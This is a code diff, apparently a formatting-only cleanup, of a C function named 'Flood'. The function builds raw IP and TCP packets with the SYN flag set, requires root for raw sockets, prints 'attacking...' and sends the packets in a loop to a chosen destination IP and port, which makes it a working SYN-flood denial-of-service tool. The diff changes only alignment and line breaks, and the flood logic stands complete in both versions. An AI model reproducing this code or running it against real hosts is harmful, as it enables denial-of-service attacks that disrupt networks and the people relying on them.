@@ -89,48 +89,45 @@ void Flood(void* destinationIPvoid)
 
     memset(datagram, 0, 4096);
 
-    ipHeader->ihl = 5;                                            
-    ipHeader->version = 4;                                        
-    ipHeader->tos = 0;                                           
-    ipHeader->tot_len = sizeof(struct ip) + sizeof(struct tcphdr);
-    ipHeader->id = htons(54321);                              
+    ipHeader->ihl      = 5;                                            
+    ipHeader->version  = 4;                                        
+    ipHeader->tos      = 0;                                           
+    ipHeader->tot_len  = sizeof(struct ip) + sizeof(struct tcphdr);
+    ipHeader->id       = htons(54321);                              
     ipHeader->frag_off = 0;              
-    ipHeader->ttl = 255;                  
+    ipHeader->ttl      = 255;                  
     ipHeader->protocol = IPPROTO_TCP;    
-    ipHeader->check = 0;                 
-    ipHeader->daddr = socketAddressInput.sin_addr.s_addr;
+    ipHeader->check    = 0;                 
+    ipHeader->daddr    = socketAddressInput.sin_addr.s_addr;
 
-    tcpHeader->dest = htons(destinationPort);
-    tcpHeader->seq = 0;                   
+    tcpHeader->dest    = htons(destinationPort);
+    tcpHeader->seq     = 0;                   
     tcpHeader->ack_seq = 0;
-    tcpHeader->doff = 5;
-    tcpHeader->fin = 0;
-    tcpHeader->syn = true;
-    tcpHeader->rst = false;
-    tcpHeader->psh = 0;
-    tcpHeader->ack = 0;
-    tcpHeader->urg = 0;
-    tcpHeader->window = htons(5840);
+    tcpHeader->doff    = 5;
+    tcpHeader->fin     = 0;
+    tcpHeader->syn     = true;
+    tcpHeader->rst     = false;
+    tcpHeader->psh     = 0;
+    tcpHeader->ack     = 0;
+    tcpHeader->urg     = 0;
+    tcpHeader->window  = htons(5840);
     tcpHeader->urg_ptr = 0;
 
     pseudoHeader.destinationAddress = socketAddressInput.sin_addr.s_addr;
-    pseudoHeader.placeholder = 0;
-    pseudoHeader.protocol = IPPROTO_TCP;
-    pseudoHeader.tcpLength = htons(20);
+    pseudoHeader.placeholder        = 0;
+    pseudoHeader.protocol           = IPPROTO_TCP;
+    pseudoHeader.tcpLength          = htons(20);
 
     int tempOne = 1;
     const int* value = &tempOne;
-    if (setsockopt(socketFD, IPPROTO_IP, IP_HDRINCL, 
-                   value, sizeof(tempOne)) < 0)
+    if (setsockopt(socketFD, IPPROTO_IP, IP_HDRINCL, value, sizeof(tempOne)) < 0)
     {
-        printf("[ERR: %s] number : %d  Error message : %s \n", 
-               destinationIP, errno, strerror(errno));
+        printf("[ERR: %s] number : %d  Error message : %s \n", destinationIP, errno, strerror(errno));
         fprintf(stderr, "Program needs to be run by root user\n");
         exit(-1);
     }
 
-    printf("[DATA: %s@%d] attacking...\n", 
-           destinationIP, destinationPort);
+    printf("[DATA: %s@%d] attacking...\n", destinationIP, destinationPort);
 
     while (isSending) 
     {
@@ -146,9 +143,7 @@ void Flood(void* destinationIPvoid)
         memcpy(&pseudoHeader.tcpHeader, tcpHeader, sizeof(struct tcphdr));
         tcpHeader->check = Checksum((unsigned short*) &pseudoHeader, sizeof(PseudoHeader));
 
-        if (sendto(socketFD, datagram, ipHeader->tot_len, 0, 
-                   (struct sockaddr*) &socketAddressInput, 
-                   sizeof(socketAddressInput)) < 0) 
+        if (sendto(socketFD, datagram, ipHeader->tot_len, 0, (struct sockaddr*) &socketAddressInput, sizeof(socketAddressInput)) < 0) 
         {
             printf("\n[ERR: %s] Program terminated\n", destinationIP);
             exit(0);
